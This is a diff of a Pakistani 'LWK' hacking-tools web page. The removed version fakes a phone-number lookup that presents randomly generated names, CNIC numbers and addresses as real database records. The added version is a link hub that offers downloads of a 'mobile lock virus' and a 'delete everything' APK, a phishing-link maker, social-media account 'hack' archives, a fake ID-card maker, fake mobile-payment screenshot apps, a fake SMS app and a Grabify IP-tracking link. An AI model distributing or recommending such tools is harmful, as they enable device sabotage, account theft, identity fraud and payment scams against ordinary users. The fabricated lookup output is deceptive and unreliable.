@@ -1,298 +1,286 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>LWK Database</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>LWK-Toolkit</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
   <style>
-    body {
+    * {
+      box-sizing: border-box;
       margin: 0;
       padding: 0;
-      background: #000;
-      font-family: 'Courier New', monospace;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+    }
+    
+    body {
+      margin: 0;
+      font-family: 'Orbitron', sans-serif;
+      background: url('https://i.ibb.co/PzGnDzRn/Screenshot-20250416-201441-2.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: #fff;
       height: 100vh;
+      width: 100%;
       overflow: hidden;
-      position: relative;
+      display: flex;
+      flex-direction: column;
     }
 
-    /* Matrix background animation */
-    .matrix-bg {
-      position: absolute;
+    header {
+      background-color: rgba(0, 0, 0, 0.7);
+      color: #0f0;
+      padding: 20px;
+      font-size: 28px;
+      font-weight: bold;
+      text-shadow: 0 0 10px #0f0, 0 0 20px #0f0;
+      letter-spacing: 1px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: fixed;
       top: 0;
       left: 0;
+      right: 0;
+      z-index: 999;
       width: 100%;
-      height: 100%;
-      z-index: -1;
-      opacity: 0.15;
-      overflow: hidden;
+      gap: 10px;
     }
 
-    .matrix-column {
-      position: absolute;
-      top: -100%;
-      color: #0f0;
-      font-size: 18px;
-      writing-mode: vertical-rl;
-      text-orientation: upright;
-      text-shadow: 0 0 5px #0f0;
-      animation: matrix-fall linear infinite;
+    .profile-img {
+      width: 42px;
+      height: 42px;
+      border-radius: 50%;
+      margin-right: 12px;
+      border: 2px solid #0f0;
+      box-shadow: 0 0 6px #0f0;
     }
 
-    @keyframes matrix-fall {
-      0% { transform: translateY(-100%); }
-      100% { transform: translateY(100vh); }
+    hr {
+      margin: 0;
+      border: 1px solid #333;
     }
 
-    .box {
-      background: rgba(0, 20, 0, 0.8);
-      border: 1px solid #0f0;
-      box-shadow: 0 0 25px #0f0;
-      padding: 25px 20px;
-      border-radius: 5px;
-      width: 90%;
-      max-width: 350px;
-      text-align: center;
-      position: relative;
-      z-index: 1;
+    .content-container {
+      flex: 1;
+      overflow-y: auto;
+      padding: 10px;
+      margin-top: 80px; /* space for fixed header */
+      margin-bottom: 70px; /* space for fixed bottom bar */
+      -webkit-overflow-scrolling: touch; /* for smooth scrolling on iOS */
     }
 
-    .top-title {
-      color: #0f0;
-      text-shadow: 0 0 10px #0f0;
+    .btn {
+      display: block;
+      width: 80%;
+      max-width: 300px;
+      padding: 12px;
+      margin: 15px auto;
       font-size: 16px;
-      margin-bottom: 5px;
       font-weight: bold;
-      letter-spacing: 2px;
-    }
-
-    .box h2 {
       color: #0f0;
-      font-size: 20px;
-      margin-bottom: 15px;
-      text-shadow: 0 0 5px #0f0;
-      letter-spacing: 1px;
-    }
-
-    .input-container {
-      display: flex;
-      justify-content: center;
-      margin-bottom: 15px;
-    }
-
-    .box input {
-      width: 90%;
-      padding: 10px;
-      border-radius: 0;
-      border: 1px solid #0f0;
-      font-size: 14px;
-      background: #000;
-      color: #0f0;
+      background: transparent;
+      border: 2px solid #0f0;
+      border-radius: 30px;
+      cursor: pointer;
       box-shadow: inset 0 0 10px #0f0;
-      font-family: 'Courier New', monospace;
+      transition: all 0.3s ease-in-out;
+      text-shadow: 0 0 8px black;
+      text-decoration: none;
+      text-align: center;
     }
 
-    .box input::placeholder {
-      color: #0a0;
-      opacity: 0.7;
+    .btn:hover {
+      transform: scale(1.02);
+      background: rgba(0, 255, 0, 0.1);
+      box-shadow: 0 0 15px #0f0, inset 0 0 10px #0f0;
     }
 
-    .box button {
-      width: 90%;
-      padding: 10px;
-      border: 1px solid #0f0;
-      border-radius: 0;
-      margin: 8px 0;
+    .bottom-bar {
+      background-color: rgba(0, 0, 0, 0.7);
+      border-top: 1px solid #333;
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      padding: 10px 0;
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      width: 100%;
+      z-index: 999;
+    }
+
+    .bottom-btn {
+      text-align: center;
       font-size: 14px;
+      color: #0f0;
+      flex: 1;
+      cursor: pointer;
+      text-decoration: none;
+    }
+
+    .bottom-btn img {
+      width: 26px;
+      height: 26px;
+      display: block;
+      margin: 0 auto 5px;
+      filter: drop-shadow(0 0 5px #0f0);
+    }
+
+    .bottom-btn span {
+      text-shadow: 0 0 5px #0f0;
+      font-weight: bold;
+    }
+    
+    /* Media queries for better responsiveness */
+    @media (max-width: 768px) {
+      .btn {
+        width: 90%;
+        font-size: 14px;
+        padding: 10px;
+      }
+      
+      header {
+        font-size: 24px;
+        padding: 15px;
+      }
+      
+      .profile-img {
+        width: 36px;
+        height: 36px;
+      }
+    }
+    
+    @media (max-width: 480px) {
+      .btn {
+        width: 95%;
+        font-size: 12px;
+        margin: 10px auto;
+      }
+      
+      header {
+        font-size: 20px;
+        padding: 12px;
+      }
+      
+      .bottom-btn {
+        font-size: 12px;
+      }
+      
+      .bottom-btn img {
+        width: 22px;
+        height: 22px;
+      }
+    }
+
+    /* Updated Download Button Style */
+    .download-btn {
+      background-color: #00ff00; /* Full bright green */
+      color: #000; /* Black text */
+      padding: 8px 16px;
+      border: none;
+      border-radius: 30px;
+      font-size: 16px;
       font-weight: bold;
       cursor: pointer;
-      color: #000;
-      background: #0f0;
-      box-shadow: 0 0 15px #0f0;
-      transition: 0.3s;
-      font-family: 'Courier New', monospace;
-      letter-spacing: 1px;
+      box-shadow: none;
+      text-shadow: none;
+      transition: background-color 0.3s ease;
     }
 
-    .box button:hover {
-      transform: scale(1.02);
-      background: #0a0;
+    .download-btn:hover {
+      background-color: #00e600; /* Slightly darker green on hover */
+    }
+
+    /* Settings button */
+    .settings-btn {
+      background: none;
+      border: none;
+      font-size: 24px;
       color: #0f0;
-    }
-
-    .whatsapp-btn {
-      background: #25D366;
-      border: 1px solid #25D366;
-      color: white;
-    }
-
-    #responseBox {
-      color: #0f0;
-      margin: 15px auto 0;
-      font-size: 14px;
-      display: none;
-      background: rgba(0, 10, 0, 0.5);
-      border: 1px solid #0f0;
-      padding: 12px;
-      border-radius: 0;
-      text-align: left;
-      font-family: 'Courier New', monospace;
-      line-height: 1.5;
-      width: 90%;
-    }
-
-    .blink {
-      animation: blink 1s infinite;
-    }
-
-    @keyframes blink {
-      0% { opacity: 1; }
-      50% { opacity: 0; }
-      100% { opacity: 1; }
-    }
-
-    .footer {
-      color: #0a0;
-      margin-top: 15px;
-      font-size: 12px;
+      cursor: pointer;
     }
   </style>
 </head>
 <body>
-  <div class="matrix-bg" id="matrixBg"></div>
 
-  <div class="box">
-    <div class="top-title">LEARN WITH KAMRAN DATABASE</div>
-    <h2>🔍 SIM DATA TERMINAL</h2>
-    <div class="input-container">
-      <input type="text" id="number" placeholder="ENTER TARGET NUMBER" required />
-    </div>
-    <button onclick="fetchData()">⏎ Search data</button>
+  <header>
+    <img class="profile-img" src="https://i.ibb.co/gM7Yjz8r/IMG-20250416-200959.jpg" alt="Profile">
+    LWK-Toolkit
+    <a href="https://www.mediafire.com/file/rybkoaw0yki5bnb/LWK-Toolkit.apk/file" download>
+      <button class="download-btn">Download APK</button>
+    </a>
+    <button class="settings-btn">&#8942;</button> <!-- 3 vertical dots Unicode -->
+  </header>
+  <hr>
 
-    <div id="responseBox"></div>
+  <div class="content-container">
+    <a href="https://Quran.com" target="_blank" class="btn">Read Quran</a>
+      <a href="https://lwk-hacker.github.io/LWK-Database/" target="_blank" class="btn">LWK Database</a>
+    <a href="https://www.mediafire.com/file/i6dghyxuotugvml/Tiktok+For+You+Trick.pdf/file" target="_blank" class="btn">TikTok For You Trick</a>
+    <a class="btn" href="https://youtu.be/L5Mi1bONwjE?si=dRjkUQFSrn5IdyXA" target="_blank">Unlimited fake WhatsApp numbers</a>
+    <a class="btn" href="https://www.mediafire.com/file/f8shun6xzcnmy7k/WA_Number_Hide_By_AbheeBhai.zip/file" target="_blank">Whatsapp hide method</a>
+    <a class="btn" href="https://www.mediafire.com/file/ytwzd2kk0efzzat/YouTube_4k_Watchtime_Methid_By_AbheeBhai_Mods.zip/file" target="_blank">YT Watch Time method</a>
+    <a class="btn" href="https://drive.google.com/file/d/1XUfR8LP8MPkBp5Kr1dOaHMpIKnryzEat/view?usp=drivesdk" target="_blank">Tiktok USA ACC trick</a>
+    <a class="btn" href="https://www.mediafire.com/file/rvirmsr0qak96o2/tiktok_100likes_daily.zip/file" target="_blank">TIKTOK 100 likes daily</a>
+    <a href="https://shorturl.at/xBF0V" target="_blank" class="btn">gallery hack</a>
 
-    <button id="shareButton" onclick="shareWhatsApp()" style="display: none;">📲 EXPORT TO WHATSAPP</button>
-    <button class="whatsapp-btn" onclick="window.open('https://whatsapp.com/channel/0029VagXoSB05MUf3KNDz627', '_blank')">📢 JOIN WHATSAPP CHANNEL</button>
-    <div class="footer">DEVELOPED BY Kamran Brohi</div>
+<a href="https://www.mediafire.com/file/ifxvks1slvqfgj8/LIVE_SCREEN_HACK.zip/file" target="_blank" class="btn">Live Screen Hack</a>
+<a href="https://www.mediafire.com/file/dxqfnap1ojihei5/GBWhatsApp_2.25.1.75.apk/file" target="_blank" class="btn">GB Whatsapp</a>
+    <a class="btn" href="https://www.mediafire.com/file/ng58l6rvthowf8d/SuperVPN_PATCHED_BY_ABHEEBHAI.apk/file" target="_blank">Super vpn patch</a>
+    <a class="btn" href="https://www.mediafire.com/file/fhszbiksc8q1euh/TEAM_BLACK_HAT_MEMBERS.7z/file" target="_blank">Mobile lock virus [password: OLD HACKER]</a>
+    <a class="btn" href="https://www.mediafire.com/file/muxnfrta2y8dyq2/Modify_Any_Apk_LEAKED_By_AbheeBhai_Mods.zip/file" target="_blank">Hack Any apk</a>
+    <a class="btn" href="https://www.mediafire.com/file/24mxw7ly49gag6x/SafeUM.apk/file" target="_blank">Safeum mod apk</a>
+    <a class="btn" href="https://www.mediafire.com/file/ggd6xnqo4lu2bf0/MAKE_GAMES_PHISING_LINK_IN_FREE_FROM_ABHEEBHAI_MODS.zip/file" target="_blank">Game phishing maker</a>
+    <a class="btn" href="https://www.mediafire.com/file/watf6hh6jhgx995/GMAIL_WITHOUT_PHONE_NUMBERS_.zip/file" target="_blank">Unlimited Gmail without number</a>
+    <a class="btn" href="https://www.mediafire.com/file/tzsvwkgfqknutcg/Whatsapp_Hack.7z/file" target="_blank">WhatsApp Hack</a>
+    <a class="btn" href="https://www.mediafire.com/file/rsi4amf9pobui6f/Facebook_Hack.7z/file" target="_blank">Facebook Hack</a>
+    <a class="btn" href="https://www.mediafire.com/file/cdb3siibhivex8c/Instagram_Hack.7z/file" target="_blank">Instagram Hack</a>
+    <a class="btn" href="https://www.mediafire.com/file/ppezg901kv3yq0v/TikTok_Hack.7z/file" target="_blank">Tiktok Hack</a>
+    <a class="btn" href="https://wa.me/message/VBVGAKBML3HZB1" target="_blank">Tiktok Earning Paid Method</a>
+    <a class="btn" href="https://drive.google.com/file/d/17IlUQEBOOqQTMWNw4mxTuWzSfS8YM9hh/view?usp=drivesdk" target="_blank">Viral memes reel bundle</a>
+    <a class="btn" href="https://whatsapp.com/channel/0029VagXoSB05MUf3KNDz627" target="_blank">JOIN OUR CHANNEL</a>
+    <a class="btn" href="https://www.mediafire.com/file/t9c17wlzlw5fptc/WHATSAPP_HACK_THROUGH_TERMUX_-__BY_DARK_LEGEND.mp4/file" target="_blank">Whatsapp Hack by termux</a>
+    <a href="https://wa.me/message/VBVGAKBML3HZB1" target="_blank" class="btn">Contact Owner</a>
+    <a class="btn" href="https://www.mediafire.com/file/pd5q2qavkecxun9/global_magic_bullet_location.7z/file" target="_blank">Free fire magic bullet Location</a>
+    <a class="btn" href="https://www.mediafire.com/file/t7mdrhvor0vy18m/HEADSHOT_FILE_BY_SAMI_X_SASUKA.zip/file" target="_blank">Free fire Headshot file</a>
+    <a class="btn" href="https://www.mediafire.com/file/fedpj1p5ialdxyo/XSUIT_FILE_BY_SASUKA.zip/file" target="_blank">Free fire Panel</a>
+    <a class="btn" href="https://whatsapp.com/channel/0029VagXoSB05MUf3KNDz627" target="_blank">How to make own smm panel in free</a>
+    <a class="btn" href="https://www.imei.info/" target="_blank">IMEI Info</a>
+    <a class="btn" href="https://cnic.sims.pk/" target="_blank">Sim registration Check</a>
+    <a class="btn" href="https://excise.gos.pk/" target="_blank">Punjab Vechile check</a>
+    <a class="btn" href="https://vehicleverification.pk/" target="_blank">Sindh Vechile check</a>
+    <a class="btn" href="https://www.kpexcise.gov.pk/" target="_blank">KPK Vechile check</a>
+    <a class="btn" href="https://nims.nadra.gov.pk/nims/" target="_blank">COVID 19 Check</a>
+    <a class="btn" href="https://idcards.pw/" target="_blank">Fake Cnic maker</a>
+    <a class="btn" href="https://zefoy.com/" target="_blank">TikTok Views Trick</a>
+    <a class="btn" href="https://pakpoll.com/cnic/" target="_blank">Cnic Info</a>
+    <a class="btn" href="https://checkbill.pk/" target="_blank">All bill Check online</a>
+    <a class="btn" href="https://simdetails.com" target="_blank">Sim owner ship</a>
+    <a class="btn" href="https://grabify.link/track/HY9HN8" target="_blank">Device information</a>
+    <a class="btn" href="https://account.st/track-mobile/" target="_blank">Trace phone</a>
+    <a class="btn" href="https://temp-mail.org/en/" target="_blank">Tempmil</a>
+    <a class="btn" href="https://www.mediafire.com/file/4qrvq9r98lq8xkc/Delete+everything+virus.apk/file" target="_blank">Delete Everything Apk</a>
+    <a class="btn" href="https://www.mediafire.com/file/m6eokjktmk95zun/🔥ᴺᵁᴹᴮᴱᴿ🚯ᴮᴱᴺᴺᴱᴰ⇐༒SYCORAW࿐_1.0.apk/filew" target="_blank">WhatsApp ban unban</a>
+    <a class="btn" href="https://www.mediafire.com/file/22y2z429nnttib5/EASY+PAYSA+🔥.apk/file" target="_blank">Easypaisa Fake SS</a>
+    <a class="btn" href="https://www.mediafire.com/file/z2y7xo76zbg1716/JAZCASH+🔥.apk/file" target="_blank">Jazz Cash Fake SS</a>
+    <a class="btn" href="https://www.mediafire.com/file/s0tjqme7rfptrrl/Create_Fake_Sms.apk/file" target="_blank">Fake text msg</a>
+  </div>
+  <br> 
+  <br>
+  <div class="bottom-bar">
+    <a href="./home" class="bottom-btn">
+      <img src="https://img.icons8.com/ios-filled/50/00ff00/home.png" alt="Home">
+      <span>Home</span>
+    </a>
+    <a href="https://wa.me/923367027845" class="bottom-btn">
+      <img src="https://img.icons8.com/ios-filled/50/00ff00/user.png" alt="Owner">
+      <span>Owner</span>
+    </a>
+    <a href="https://whatsapp.com/channel/0029VagXoSB05MUf3KNDz627" class="bottom-btn">
+      <img src="https://img.icons8.com/ios-filled/50/00ff00/whatsapp.png" alt="WhatsApp">
+      <span>WhatsApp</span>
+    </a>
   </div>
 
-  <script>
-    // Create matrix background animation
-    function createMatrix() {
-      const matrixBg = document.getElementById('matrixBg');
-      const chars = "Learn with Kamran0123456789";
-      const columns = Math.floor(window.innerWidth / 20);
-      
-      for (let i = 0; i < columns; i++) {
-        const column = document.createElement('div');
-        column.className = 'matrix-column';
-        column.style.left = (i * 20) + 'px';
-        column.style.animationDuration = (Math.random() * 5 + 5) + 's';
-        column.style.animationDelay = (Math.random() * 5) + 's';
-        
-        let text = '';
-        const length = Math.floor(Math.random() * 10) + 10;
-        for (let j = 0; j < length; j++) {
-          text += chars.charAt(Math.floor(Math.random() * chars.length)) + '\n';
-        }
-        column.textContent = text;
-        
-        matrixBg.appendChild(column);
-      }
-    }
-
-    // Initialize matrix animation
-    window.onload = function() {
-      createMatrix();
-      typePlaceholder();
-    };
-
-    // Typing effect for input placeholder
-    function typePlaceholder() {
-      const input = document.getElementById("number");
-      const originalPlaceholder = "ENTER TARGET NUMBER";
-      let i = 0;
-      
-      function typing() {
-        if (i < originalPlaceholder.length) {
-          input.placeholder = originalPlaceholder.substring(0, i+1);
-          i++;
-          setTimeout(typing, Math.random() * 100 + 50);
-        }
-      }
-      typing();
-    }
-
-    // Function to fetch data based on searched number
-    function fetchData() {
-      const number = document.getElementById("number").value.trim();
-      const responseBox = document.getElementById("responseBox");
-      const shareButton = document.getElementById("shareButton");
-
-      if (!number) {
-        alert("INPUT ERROR: NO TARGET SPECIFIED");
-        return;
-      }
-
-      responseBox.innerHTML = `<div>CONNECTING TO DATABASE... <span class="blink">..</span></div>`;
-      responseBox.style.display = "block";
-      shareButton.style.display = "none";
-
-      // Simulating random fake data generation
-      const user = generateFakeData(number);
-      setTimeout(() => {
-        responseBox.innerHTML = `
-> DATABASE ENTRY FOUND
-> -------------------
-📞 MOBILE: ${user.Mobile}
-👤 NAME: ${user.Name}
-🆔 CNIC: ${user.CNIC}
-📍 ADDRESS: ${user.Address}
-📶 OPERATOR: ${user.Operator}
-        `;
-        shareButton.style.display = "block";
-      }, 2000); // Simulating delay
-    }
-
-    // Function to generate random user data
-    function generateFakeData(searchedNumber) {
-      const getRandomName = () => {
-        const names = ["Ali Raza", "Fatima Khan", "Zain Ahmed", "Sara Malik", "Usman Tariq", "Ayesha Siddiqui"];
-        return names[Math.floor(Math.random() * names.length)];
-      };
-
-      const getRandomCNIC = () => {
-        return `${Math.floor(10000 + Math.random() * 89999)}-${Math.floor(1000000 + Math.random() * 8999999)}-${Math.floor(1 + Math.random() * 9)}`;
-      };
-
-      const getRandomAddress = () => {
-        const areas = ["Gulshan-e-Iqbal, Karachi", "Model Town, Lahore", "G-11, Islamabad", "Saddar, Rawalpindi"];
-        return areas[Math.floor(Math.random() * areas.length)];
-      };
-
-      const getRandomOperator = () => {
-        const operators = ["Jazz", "Telenor", "Zong", "Ufone"];
-        return operators[Math.floor(Math.random() * operators.length)];
-      };
-
-      return {
-        Mobile: searchedNumber,
-        Name: getRandomName(),
-        CNIC: getRandomCNIC(),
-        Address: getRandomAddress(),
-        Operator: getRandomOperator()
-      };
-    }
-
-    // Function to share the result on WhatsApp
-    function shareWhatsApp() {
-      const responseBox = document.getElementById("responseBox");
-      const text = encodeURIComponent("LWK TOOL RESULTS:\n" + responseBox.innerText);
-      const url = `https://wa.me/?text=${text}`;
-      window.open(url, '_blank');
-    }
-  </script>
 </body>
 </html>
